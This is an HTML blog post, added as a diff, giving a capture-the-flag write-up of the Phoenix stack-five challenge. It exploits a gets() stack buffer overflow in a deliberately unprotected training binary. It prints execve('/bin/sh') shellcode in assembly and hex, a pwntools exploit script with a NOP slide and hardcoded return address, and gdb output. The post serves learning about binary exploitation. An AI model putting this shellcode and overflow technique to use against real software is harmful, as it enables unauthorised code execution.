@@ -1,0 +1,338 @@
+<!DOCTYPE html>
+<html class="default_colors_property">
+  <base href="/home/tabacco/tech/coding/web/execius.github.io/" target="">
+  <head>
+    <link rel="stylesheet" href="rsc/css/post.css">
+    <link rel="stylesheet" href="rsc/css/code.css">
+    <meta name="description" content="a brief write-up (and exploit) on why you should read the ***** manual">
+    <title>Execius : phoenix stack 5 - stack buffer overflow</title>
+          
+    <link rel="stylesheet" href="rsc/css/mainstyle.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css">
+    <meta charset="UTF-8">
+    <meta name="keywords" content="binary exploitation, hacking, pwn, reverse engineering , Execius">
+    <meta name="author" content="Execius">
+
+
+  </head>
+
+  <body>
+          
+    <nav class="bar navbar">
+
+      <div class="home_logo bar_item">
+        <a class="button logo_text"  href="index.html" >Execius</a>
+      </div>
+
+      <div class="categories bar_item">
+        <a class="button" href="./rsc/html/topics/index.html"><i class="fa-solid fa-folder"></i>Topics</a>
+        <a class="button" href="rsc/html/feed/index.html"><i class="fa-solid fa-square-rss"></i>Feed</a>
+        <a class="button" href="rsc/html/resources/index.html"><i class="fa-solid fa-book"></i> resources </a>
+      </div>
+
+    </nav>
+
+
+    <div class="layout">
+      <main class="content">
+
+        <div class="post">
+          <ul>
+<li>
+<h1>phoenix stack-five write up</h1>
+</li>
+</ul>
+<h2>prologue</h2>
+<ul>
+<li>so this is one of the challenges i spent the most time with , i had forgotten many things during the university year : assembly programming , pwn library , gdb and r2 for god's sake , but this is also the challenge i learned most from , all of the things above and more i have relearned and more , in this write up i will provide some insights about what i did and what i learned.</li>
+</ul>
+<h2>what will i do?</h2>
+<ul>
+<li>in this challenge I am working with a an amd64 little indian architecture on linux , there is also no protections on the binary and the aslr is disabled on the machine(address space layout randomization)</li>
+<li>i began by reading the infamous article Phrack 48:14 , which is named same as this write up "smashing the stack for fun and profit" , here is a link :https://phrack.org/issues/49/14#article</li>
+<li>I also watched the video by liveoverflow in the series named binary exploitation , same titre .</li>
+<li>I will not go into how the stack works as it is already explained in the file <a href="the-stack-and-calling-conventions-in-x86.html">The stack and calling conventions in x86</a> </li>
+<li>same for <a href="x86_64-assembly.html">x86_64 assembly</a> and <a href="virtual-memory.html">virtual memory</a></li>
+</ul>
+<h2>analysis of the binary</h2>
+<ul>
+<li>so first we run the file in the terminal , it seems to get input from the user :</li>
+</ul>
+<div class="codehilite"><pre><span></span><code>user@phoenix-amd64:/tmp/test$<span class="w"> </span>./stack-five
+Welcome<span class="w"> </span>to<span class="w"> </span>phoenix/stack-five,<span class="w"> </span>brought<span class="w"> </span>to<span class="w"> </span>you<span class="w"> </span>by<span class="w"> </span>https://exploit.education
+sdlfkjsdklfj
+user@phoenix-amd64:/tmp/test$
+</code></pre></div>
+
+<ul>
+<li>after checking the c code in the site of exploit education it seems like that's exactly what the program does:</li>
+</ul>
+<div class="codehilite"><pre><span></span><code><span class="cm">/*</span>
+<span class="cm"> * phoenix/stack-five, by https://exploit.education</span>
+<span class="cm"> *</span>
+<span class="cm"> * Can you execve(&quot;/bin/sh&quot;, ...) ?</span>
+<span class="cm"> *</span>
+<span class="cm"> * What is green and goes to summer camp? A brussel scout.</span>
+<span class="cm"> */</span>
+
+<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdio.h&gt;</span>
+<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdlib.h&gt;</span>
+<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;string.h&gt;</span>
+<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;unistd.h&gt;</span>
+
+<span class="cp">#define BANNER \</span>
+<span class="cp">  &quot;Welcome to &quot; LEVELNAME &quot;, brought to you by https:</span><span class="c1">//exploit.education&quot;</span>
+
+<span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="nf">gets</span><span class="p">(</span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="p">);</span>
+
+<span class="kt">void</span><span class="w"> </span><span class="nf">start_level</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
+<span class="w">  </span><span class="kt">char</span><span class="w"> </span><span class="n">buffer</span><span class="p">[</span><span class="mi">128</span><span class="p">];</span>
+<span class="w">  </span><span class="n">gets</span><span class="p">(</span><span class="n">buffer</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="kt">int</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">argc</span><span class="p">,</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="o">**</span><span class="n">argv</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">  </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;%s</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">BANNER</span><span class="p">);</span>
+<span class="w">  </span><span class="n">start_level</span><span class="p">();</span>
+<span class="p">}</span>
+</code></pre></div>
+
+<ul>
+<li>we can see that the program declares an array of size 128 and takes input into it using the function <strong>gets</strong> which is insecure as it doesn't do any bounds checking and can take input bigger than the size of the array (see the man page), this is called an overflow and it is the base of our attack. </li>
+<li>Now , our goal is to spawn a shell ,we know that the program has no function that does that so we got to make the binary execute our own code , but first , we gotta make that code that's gonna spawn us a shell , that is called a shell code , and if we can make it and place into the stack , then make the rip pointer point to it , the processor will run it without  question because the stack in this case is executable , although in there days these are protection that make the stack non-executable , this is not true in our case and the world is so damn beautiful .</li>
+</ul>
+<h1>making the shellcode</h1>
+<ul>
+<li>so how we're gonna make the code you say ? just fire up vim and write some x86 assembly  , and make a program that spawns a shell by executing "/bin/sh" , this step has taken me hours as i have forgot most about x86 assembly , however I did it and here is the code : </li>
+</ul>
+<div class="codehilite"><pre><span></span><code><span class="nf">sub</span><span class="w"> </span><span class="nb">rsp</span><span class="w"> </span><span class="p">,</span><span class="w"> </span><span class="mh">0x28</span>
+<span class="nf">mov</span><span class="w"> </span><span class="nb">rax</span><span class="p">,</span><span class="w"> </span><span class="mh">0x68732f6e69622f</span>
+<span class="nf">mov</span><span class="w"> </span><span class="kt">QWORD</span><span class="w"> </span><span class="p">[</span><span class="nb">rsp</span><span class="p">],</span><span class="nb">rax</span><span class="w"> </span>
+<span class="nf">lea</span><span class="w"> </span><span class="nb">rdi</span><span class="p">,[</span><span class="nb">rsp</span><span class="p">]</span><span class="w"> </span>
+<span class="nf">xor</span><span class="w"> </span><span class="nb">rsi</span><span class="p">,</span><span class="w"> </span><span class="nb">rsi</span>
+<span class="nf">xor</span><span class="w"> </span><span class="nb">rdx</span><span class="p">,</span><span class="w"> </span><span class="nb">rdx</span>
+<span class="nf">push</span><span class="w"> </span><span class="mi">59</span>
+<span class="nf">pop</span><span class="w"> </span><span class="nb">rax</span>
+<span class="nf">syscall</span><span class="w"> </span>
+<span class="nf">push</span><span class="w"> </span><span class="mi">16</span>
+<span class="nf">pop</span><span class="w"> </span><span class="nb">rax</span>
+<span class="nf">syscall</span>
+</code></pre></div>
+
+<ul>
+<li>
+<p>explanation of these instructions:</p>
+<ol>
+<li>
+<p>we make space for the string "/bin/sh" by substracting 40 from the stack , just a random number that i'm sure can hold the string 
+    <code>nasm
+    sub rsp , 0x28</code> </p>
+</li>
+<li>
+<p>second we move the value 0x68732f6e9622f into rax , that value is the ascii representation of the string "/bin/sh"  , but reversed , because of the <a href="endianness.html">endianness</a> of the system (little endian) 
+    <code>nasm
+    mov rax, 0x68732f6e69622f</code> </p>
+</li>
+<li>
+<p>third we move the string form rax into the stack  </p>
+<p><code>nasm
+mov QWORD [rsp],rax</code> 
+     now before i continue , we are gonna make a syscall to execve , that is a function in the unix interface that executed elf programs , the first argument is the string of the path to the binary , which is passed in rdi , th second is an array of the arguments given to that binary which in this case is not needed so we will pass NULL to it (equivalent with all zeros) , and the third is envp which has to do with the environment of the program and is passed in rdx but we can pass NULL to this as well and it will work . now we continue</p>
+</li>
+<li>
+<p>fourth we are moving the address of the string to rdi </p>
+<p><code>nasm
+lea rdi,[rsp]</code> 
+    5. fifth we are xoring rsi with itself which basically sets it to NULL (all zeros)
+<code>nasm
+xor rsi, rsi</code>
+    6. we do the same to rdx and now our arguments are ready and we just need to perform the syscall and let the os do it's wizardry .
+<code>nasm
+xor rdx, rdx</code>
+    7.  we set rax to 59 (which is the number of the execve syscall) , we do that by pushing 59 into the stack and then poping it to rax .
+<code>nasm
+push 59 
+pop rax</code>
+    8. finally we perform the syscall and there you go 
+<code>nasm
+syscall</code>
+- we are done and if you have the same architecture you can check if this works by assembling and liking it:</p>
+</li>
+</ol>
+</li>
+</ul>
+<div class="codehilite"><pre><span></span><code><span class="w">    </span>$<span class="w"> </span>nasm<span class="w"> </span>-f<span class="w"> </span>elf64<span class="w"> </span>-o<span class="w"> </span>shellcode.o<span class="w"> </span>assemblyfile
+<span class="w">    </span>$<span class="w"> </span>ld<span class="w"> </span>-o<span class="w"> </span>shellcode<span class="w"> </span>shellcode.o<span class="w"> </span>
+<span class="w">    </span>$<span class="w"> </span>./shellcode
+<span class="w">    </span><span class="sb">```</span>
+-<span class="w"> </span><span class="k">then</span><span class="w"> </span>a<span class="w"> </span>shell<span class="w"> </span>will<span class="w"> </span>spawn<span class="w"> </span>,<span class="w"> </span>use<span class="w"> </span>the<span class="w"> </span><span class="nb">exit</span><span class="w"> </span><span class="nb">command</span><span class="w"> </span>to<span class="w"> </span>quit<span class="w"> </span>it<span class="w"> </span>as<span class="w"> </span>it<span class="w"> </span>is<span class="w"> </span>useless<span class="w"> </span>right<span class="w"> </span>now
+
+-<span class="w"> </span>so<span class="w"> </span>now<span class="w"> </span>we<span class="w"> </span>have<span class="w"> </span>some<span class="w"> </span>assembly<span class="w"> </span>code<span class="w"> </span>,<span class="w"> </span>but<span class="w"> </span>it<span class="w"> </span>looks<span class="w"> </span>nothing<span class="w"> </span>like<span class="w"> </span>something<span class="w"> </span>we<span class="s1">&#39;re gonna put into the stack of a program , so we are going to make a shellcode out of it , which is basically the machine code representation of that assembly , you can that manually by checking the opcode of each instruction but we hackers are lazy , we I&#39;</span>m<span class="w"> </span>just<span class="w"> </span>gonna<span class="w"> </span>dump<span class="w"> </span>the<span class="w"> </span>crap<span class="w"> </span>outta<span class="w"> </span>the<span class="w"> </span>binary<span class="w"> </span>using<span class="w"> </span>**objdump**<span class="w"> </span>I<span class="w"> </span>just<span class="w"> </span>created<span class="w"> </span>above<span class="o">(</span>that<span class="w"> </span>spawns<span class="w"> </span>a<span class="w"> </span>shell<span class="o">)</span><span class="w"> </span>and<span class="w"> </span><span class="k">then</span><span class="w"> </span>i<span class="w"> </span>will<span class="w"> </span>copy<span class="w"> </span>the<span class="w"> </span>bytes<span class="w"> </span>:
+<span class="sb">```</span>bash
+<span class="w">    </span>$<span class="w"> </span>objdump<span class="w"> </span>-d<span class="w"> </span>shellcode
+
+shellcode:<span class="w">     </span>file<span class="w"> </span>format<span class="w"> </span>elf64-x86-64
+
+
+Disassembly<span class="w"> </span>of<span class="w"> </span>section<span class="w"> </span>.text:
+
+<span class="m">0000000000401000</span><span class="w"> </span>&lt;__bss_start-0x1000&gt;:
+<span class="w">  </span><span class="m">401000</span>:<span class="w">       </span><span class="m">48</span><span class="w"> </span><span class="m">83</span><span class="w"> </span>ec<span class="w"> </span><span class="m">28</span><span class="w">             </span>sub<span class="w">    </span><span class="nv">$0</span>x28,%rsp
+<span class="w">  </span><span class="m">401004</span>:<span class="w">       </span><span class="m">48</span><span class="w"> </span>b8<span class="w"> </span>2f<span class="w"> </span><span class="m">62</span><span class="w"> </span><span class="m">69</span><span class="w"> </span>6e<span class="w"> </span>2f<span class="w">    </span>movabs<span class="w"> </span><span class="nv">$0</span>x68732f6e69622f,%rax
+<span class="w">  </span>40100b:<span class="w">       </span><span class="m">73</span><span class="w"> </span><span class="m">68</span><span class="w"> </span><span class="m">00</span>
+<span class="w">  </span>40100e:<span class="w">       </span><span class="m">48</span><span class="w"> </span><span class="m">89</span><span class="w"> </span><span class="m">04</span><span class="w"> </span><span class="m">24</span><span class="w">             </span>mov<span class="w">    </span>%rax,<span class="o">(</span>%rsp<span class="o">)</span>
+<span class="w">  </span><span class="m">401012</span>:<span class="w">       </span><span class="m">48</span><span class="w"> </span>8d<span class="w"> </span>3c<span class="w"> </span><span class="m">24</span><span class="w">             </span>lea<span class="w">    </span><span class="o">(</span>%rsp<span class="o">)</span>,%rdi
+<span class="w">  </span><span class="m">401016</span>:<span class="w">       </span><span class="m">48</span><span class="w"> </span><span class="m">31</span><span class="w"> </span>f6<span class="w">                </span>xor<span class="w">    </span>%rsi,%rsi
+<span class="w">  </span><span class="m">401019</span>:<span class="w">       </span><span class="m">48</span><span class="w"> </span><span class="m">31</span><span class="w"> </span>d2<span class="w">                </span>xor<span class="w">    </span>%rdx,%rdx
+<span class="w">  </span>40101c:<span class="w">       </span>6a<span class="w"> </span>3b<span class="w">                   </span>push<span class="w">   </span><span class="nv">$0</span>x3b
+<span class="w">  </span>40101e:<span class="w">       </span><span class="m">58</span><span class="w">                      </span>pop<span class="w">    </span>%rax
+<span class="w">  </span>40101f:<span class="w">       </span>0f<span class="w"> </span><span class="m">05</span><span class="w">                   </span>syscall
+<span class="w">  </span><span class="m">401021</span>:<span class="w">       </span>6a<span class="w"> </span><span class="m">10</span><span class="w">                   </span>push<span class="w">   </span><span class="nv">$0</span>x10
+<span class="w">  </span><span class="m">401023</span>:<span class="w">       </span><span class="m">58</span><span class="w">                      </span>pop<span class="w">    </span>%rax
+<span class="w">  </span><span class="m">401024</span>:<span class="w">       </span>0f<span class="w"> </span><span class="m">05</span><span class="w">                   </span>syscall<span class="w">     </span>
+</code></pre></div>
+
+<ul>
+<li>in the middle section you can see some random numbers , that is our assembly but in the machine language , after copying and some sanitizing , it looks like this :</li>
+</ul>
+<div class="codehilite"><pre><span></span><code><span class="se">\x</span><span class="m">48</span><span class="se">\x</span><span class="m">83</span><span class="se">\x</span>ec<span class="se">\x</span><span class="m">28</span><span class="se">\x</span><span class="m">48</span><span class="se">\x</span>b8<span class="se">\x</span>2f<span class="se">\x</span>2f<span class="se">\x</span><span class="m">62</span><span class="se">\x</span><span class="m">69</span><span class="se">\x</span>6e<span class="se">\x</span>2f<span class="se">\x</span><span class="m">73</span><span class="se">\x</span><span class="m">68</span><span class="se">\x</span><span class="m">48</span><span class="se">\x</span><span class="m">89</span><span class="se">\x</span><span class="m">04</span><span class="se">\x</span><span class="m">24</span><span class="se">\x</span><span class="m">48</span><span class="se">\x</span>8d<span class="se">\x</span>3c<span class="se">\x</span><span class="m">24</span><span class="se">\x</span><span class="m">48</span><span class="se">\x</span><span class="m">31</span><span class="se">\x</span>f6<span class="se">\x</span><span class="m">48</span><span class="se">\x</span><span class="m">31</span><span class="se">\x</span>d2<span class="se">\x</span>6a<span class="se">\x</span>3b<span class="se">\x</span><span class="m">58</span><span class="se">\x</span>0f<span class="se">\x</span><span class="m">05</span><span class="se">\x</span>6a<span class="se">\x</span><span class="m">10</span><span class="se">\x</span><span class="m">58</span><span class="se">\x</span>0f<span class="se">\x</span><span class="m">05</span>
+</code></pre></div>
+
+<ul>
+<li>now this is ready to go into the stack , but how we are going to execute it ? in a hacker's words , how were're gonna make the rip pointer point to it ? I've got you neighbor .</li>
+</ul>
+<h2>making the exploit</h2>
+<ul>
+<li>now we know that the <a href="stack-frame.html">Stack frame</a> of the start level function will look like this :</li>
+</ul>
+<div class="codehilite"><pre><span></span><code>+---------------------------+  &lt;-- Higher memory address
+|  Return Address           |  (Saved by the `call` instruction)
++---------------------------+
+|  Saved Base Pointer (RBP) |  (Old RBP of the caller function)
++---------------------------+
+|  128-byte Buffer          |  (Local buffer in the stack frame)
+|  [---------------------]  |
+|  [        128 B        ]  |
+|  [---------------------]  |
++---------------------------+  &lt;-- Lower memory address (Stack grows downward)
+</code></pre></div>
+
+<ul>
+<li>
+<p>since the gets makes no bounds checks , we can overwrite the values that are after the buffer chunk , and there is our <strong>ret</strong> , the address that the function will return to when its execution is complete , as we will be writing upwards with our input , we can <strong>overwrite  the ret address</strong> , and make it point to the stack , where our code is happily waiting to be executed, now that we cracked this in theory  , it's time to craft our exploit .</p>
+</li>
+<li>
+<p>I use python and the pwn library to do this :</p>
+</li>
+</ul>
+<div class="codehilite"><pre><span></span><code><span class="kn">from</span><span class="w"> </span><span class="nn">pwn</span><span class="w"> </span><span class="kn">import</span> <span class="o">*</span>
+<span class="n">context</span><span class="o">.</span><span class="n">arch</span>      <span class="o">=</span> <span class="s1">&#39;amd64&#39;</span>
+<span class="n">context</span><span class="o">.</span><span class="n">os</span>        <span class="o">=</span> <span class="s1">&#39;linux&#39;</span>
+<span class="n">context</span><span class="o">.</span><span class="n">endian</span>    <span class="o">=</span> <span class="s1">&#39;little&#39;</span>
+<span class="n">context</span><span class="o">.</span><span class="n">word_size</span> <span class="o">=</span> <span class="mi">64</span>
+<span class="n">shellcode</span> <span class="o">=</span><span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x48\x83\xec\x27\x48\xb8\x2f\x62\x69\x6e\x2f\x73\x68\x00\x48\x89\x04\x24\x48\x8d\x3c\x24\x48\x31\xf6\x48\x31\xd2\x6a\x3b\x58\x0f\x05</span><span class="s2">&quot;</span>
+<span class="n">stacksize</span><span class="o">=</span><span class="mi">144</span>
+<span class="n">padding</span><span class="o">=</span> <span class="n">stacksize</span> <span class="o">-</span><span class="nb">len</span><span class="p">(</span><span class="n">shellcode</span><span class="p">)</span><span class="o">-</span><span class="mi">8</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x90</span><span class="s1">&#39;</span><span class="o">*</span><span class="n">padding</span><span class="o">+</span><span class="n">shellcode</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x00007fffffffe610</span><span class="p">)</span>
+<span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s2">&quot;./stack-five&quot;</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div>
+
+<p>now lets explain this :
+- as you can see , in the begging i import the library and the tell it what my architecture is by defining the context struct , all of this is generic , then we got our shell code defined(as binary data , that is necessary as the cpu only knows binary) and the stack size.
+- the padding is how much we're gonna fill the stack before introducing our shell code and our ret address substitution , fill it with what you say ? a nop slide .</p>
+<ul>
+<li>
+<p>nop is and operation that does nothing , just passes the ball to the instruction after it , if we fill the stack with it before our code , if the instruction pointer happens to point to any of those nops (which are longer than our shellcode and ret substitution) , it will <strong>slide</strong> right to our shell code in a series of nops , that where the name comes from , this is very useful in the in the case where we dont know the exact offset of the stack , as if  we cover a large area with nops , the chances of our code getting executed get <strong>way higher</strong>  as no matter where rip happens to point in that line of nops , the will always lead it right to our code . </p>
+</li>
+<li>
+<p>the -8 in the padding makes space for the value we'll replace ret with .</p>
+</li>
+<li>our code is in the stack , so we gotta replace ret with the address of the stack (rsp) , to get it we will use gdb:</li>
+</ul>
+<div class="codehilite"><pre><span></span><code><span class="nf">$</span><span class="w"> </span><span class="nv">gdb</span><span class="w"> </span><span class="nv">stack</span><span class="w"> </span><span class="nv">five</span>
+<span class="nf">gdb</span><span class="w"> </span><span class="nv">bla</span><span class="w"> </span><span class="nv">bla</span><span class="w"> </span><span class="nv">bla</span>
+
+<span class="err">(</span><span class="nf">gdb</span><span class="p">)</span><span class="w"> </span><span class="nv">b</span><span class="w"> </span><span class="nv">start_level</span>
+<span class="nf">Breakpoint</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="nv">at</span><span class="w"> </span><span class="mh">0x400591</span>
+<span class="err">(</span><span class="nf">gdb</span><span class="p">)</span><span class="w"> </span><span class="nv">run</span>
+<span class="nf">Breakpoint</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="w"> </span><span class="mh">0x0000000000400591</span><span class="w"> </span><span class="nv">in</span><span class="w"> </span><span class="nv">start_level</span><span class="w"> </span><span class="p">()</span>
+<span class="err">(</span><span class="nf">gdb</span><span class="p">)</span><span class="w"> </span><span class="nv">info</span><span class="w"> </span><span class="nv">r</span>
+<span class="err">(</span><span class="nf">gdb</span><span class="p">)</span><span class="w"> </span><span class="nv">info</span><span class="w"> </span><span class="nv">r</span>
+<span class="nf">rax</span><span class="w">            </span><span class="mh">0x0</span><span class="w">                 </span><span class="mh">0x0</span>
+<span class="nf">rbx</span><span class="w">            </span><span class="mh">0x7fffffffe688</span><span class="w">      </span><span class="mh">0x7fffffffe688</span>
+<span class="nf">rcx</span><span class="w">            </span><span class="mh">0x7ffff7db6d07</span><span class="w">      </span><span class="mh">0x7ffff7db6d07</span>
+<span class="nf">rdx</span><span class="w">            </span><span class="mh">0x0</span><span class="w">                 </span><span class="mh">0x0</span>
+<span class="nf">rsi</span><span class="w">            </span><span class="mh">0x7fffffffe560</span><span class="w">      </span><span class="mh">0x7fffffffe560</span>
+<span class="nf">rdi</span><span class="w">            </span><span class="mh">0x4b</span><span class="w">                </span><span class="mh">0x4b</span>
+<span class="nf">rbp</span><span class="w">            </span><span class="mh">0x7fffffffe610</span><span class="w">      </span><span class="mh">0x7fffffffe610</span>
+<span class="nf">rsp</span><span class="w">            </span><span class="mh">0x7fffffffe610</span><span class="w">      </span><span class="mh">0x7fffffffe610</span>
+<span class="nf">r8</span><span class="w">             </span><span class="mh">0x7ffff7ffb300</span><span class="w">      </span><span class="mh">0x7ffff7ffb300</span>
+<span class="nf">r9</span><span class="w">             </span><span class="mh">0x7fffffffe5ef</span><span class="w">      </span><span class="mh">0x7fffffffe5ef</span>
+<span class="nf">r10</span><span class="w">            </span><span class="mh">0x1</span><span class="w">                 </span><span class="mh">0x1</span>
+<span class="nf">r11</span><span class="w">            </span><span class="mh">0x206</span><span class="w">               </span><span class="mh">0x206</span>
+<span class="nf">r12</span><span class="w">            </span><span class="mh">0x7fffffffe698</span><span class="w">      </span><span class="mh">0x7fffffffe698</span>
+<span class="nf">r13</span><span class="w">            </span><span class="mh">0x4005a4</span><span class="w">            </span><span class="mh">0x4005a4</span>
+</code></pre></div>
+
+<ul>
+<li>
+<p>as we can see the rsp in this function's stack frame is 0x7fffffffe610 so we're gonna overwrite ret with that.</p>
+</li>
+<li>
+<p>there comes our payload we just fill the padding with the opcode of nop instruction which is $0x90$ then we put our shell code then we pack the address of the stack with p64 that makes it binary so the cpu can read it.</p>
+</li>
+<li>after that we open a process with the process function in pwnlib, and then we send the payload as input to it , that should give us a shell.</li>
+<li>p.interactive let's us interact with the shell when it spawns</li>
+</ul>
+<h2>testing our exploit</h2>
+<div class="codehilite"><pre><span></span><code><span class="w"> </span>$<span class="w"> </span>python<span class="w"> </span>./smashingthestackforfunandprofit.py
+
+<span class="o">[</span>x<span class="o">]</span><span class="w"> </span>Starting<span class="w"> </span><span class="nb">local</span><span class="w"> </span>process<span class="w"> </span><span class="s1">&#39;./stack-five&#39;</span>
+<span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Starting<span class="w"> </span><span class="nb">local</span><span class="w"> </span>process<span class="w"> </span><span class="s1">&#39;./stack-five&#39;</span>:<span class="w"> </span>pid<span class="w"> </span><span class="m">1048</span>
+<span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Switching<span class="w"> </span>to<span class="w"> </span>interactive<span class="w"> </span>mode
+Welcome<span class="w"> </span>to<span class="w"> </span>phoenix/stack-five,<span class="w"> </span>brought<span class="w"> </span>to<span class="w"> </span>you<span class="w"> </span>by<span class="w"> </span>https://exploit.education
+ls
+ls
+assembly.s<span class="w">  </span>payload<span class="w">  </span>shellcode<span class="w">  </span>smashingthestackforfunandprofit.py<span class="w">  </span>stack-five
+cat<span class="w"> </span>assembly.s
+execute:
+sub<span class="w"> </span><span class="nv">$0</span>x27,<span class="w"> </span>%rsp
+<span class="w">    </span>movabs<span class="w"> </span><span class="nv">$0</span>x68732f6e69622f,<span class="w"> </span>%rax
+<span class="w">    </span>movq<span class="w"> </span>%rax,<span class="w"> </span><span class="o">(</span>%rsp<span class="o">)</span>
+<span class="w">    </span>leaq<span class="w"> </span><span class="o">(</span>%rsp<span class="o">)</span>,<span class="w"> </span>%rdi
+<span class="w">    </span>xorq<span class="w"> </span>%rsi,<span class="w"> </span>%rsi
+<span class="w">    </span>xorq<span class="w"> </span>%rdx,<span class="w"> </span>%rdx
+<span class="w">    </span>pushq<span class="w"> </span><span class="nv">$59</span>
+<span class="w">    </span>popq<span class="w"> </span>%rax
+<span class="w">    </span>syscall
+<span class="w">    </span>pushq<span class="w"> </span><span class="nv">$16</span>
+<span class="w">    </span>popq<span class="w"> </span>%rax
+<span class="w">    </span>syscall
+</code></pre></div>
+
+<h2>tips and pitfalls</h2>
+<ul>
+<li>
+<p>if your shell code doesn't work , use the int3 instruction  to make a SIGTRAP which is a fancy word for break point , for example put this in the beginning of your shell code to check if it executes , if it does the program will stop and report a sigtrap , if it doesn't then there is a problem in the ret address you overwrote the old one with, which in our case is the stack pointer , and that brings us to a pitfall i wanna talk about.</p>
+</li>
+<li>
+<p>i did a mistake and it drove me nuts , i was ssh-ing into the VM and using gdb to determine the stack pointer in the target function and i used that in my exploit and when I ran the exploit in the VM directly it wouldn't work , but it worked in my machine , I took me a while to think of rechecking the stack address using gdb in the VM itself since i didn't suspect ssh-ing into it would make any change , then i found that the address was different from my ssh session , turns out it has something to do with the environment variables with are put in the memory layout of the program before the stack , and thus they affect its offset , changing the address by few bytes , but that was enough to make my exploit break because i was using an address lower than the whole stack, now i could used an address that is bigger than the stack and the nop slide would have fixed that anyway , why didn't i do it ? because I am an idiot.</p>
+</li>
+</ul>
+<h1>epilogue</h1>
+<p><strong>and voila ,stack smashed , profit (and a lot of dumb mistakes) made, way too much coffee sipped ,wizardry done , shell spawned from an innocent program, I hope that I was helpful , stay crafty , stay curious and see you space cowboys</strong></p>
+        </div>
+      </main>
+    </div>
+  </body>
+      
+    <footer>
+
+      <div class="contactme bar_item">
+        <a class="button" href="https://x.com/execius"><i class="fa-brands fa-x-twitter fa-2x"></i></a> 
+      </div>
+    </footer>
+
+</html> 
+
